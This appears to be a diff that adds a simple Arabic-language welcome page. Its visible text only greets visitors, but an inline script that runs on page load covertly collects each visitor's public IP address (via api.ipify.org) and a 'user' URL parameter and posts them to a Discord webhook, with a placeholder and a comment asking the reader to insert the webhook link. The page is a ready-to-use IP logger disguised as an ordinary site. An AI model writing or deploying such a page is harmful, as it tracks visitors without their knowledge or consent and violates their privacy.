@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>موقعي</title>
+    <style>
+        body {
+            background: #111;
+            color: #fff;
+            font-family: sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            font-size: 3em;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 1.2em;
+        }
+    </style>
+</head>
+<body>
+    <h1>مرحباً بك!</h1>
+    <p>شكراً لزيارتك موقعي.</p>
+
+    <script>
+    (async () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const user = urlParams.get('user') || 'unknown';
+
+        // جلب IP من خدمة خارجية
+        let ip = 'unknown';
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch (err) {
+            console.error('فشل جلب الايبي:', err);
+        }
+
+        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // << حط رابط الوبي هوك هنا
+
+        // إرسال البيانات للويب هوك
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `New visitor!\nUser: ${user}\nIP: ${ip}`
+            })
+        });
+
+        console.log('تم إرسال البيانات للويب هوك!');
+    })();
+    </script>
+</body>
+</html>
